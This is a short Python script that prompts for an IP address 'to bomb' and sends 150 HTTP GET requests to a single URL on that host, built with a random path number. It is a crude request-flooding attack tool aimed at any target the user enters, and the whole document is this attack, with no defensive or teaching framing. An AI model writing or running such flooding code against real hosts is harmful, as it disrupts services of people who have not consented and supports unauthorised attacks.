#!/usr/bin/python3

import requests
import random

ip = input("Type the IP address to bomb: ")

#create a random number between 1 and 100
random_number = str(random.randint(1,101))

#create random ip with the ip number and the random number
random_ip = "http://" + ip + "/" + random_number


for x in range(1,150):
	r = requests.get('{}'.format(random_ip))

print("Done!")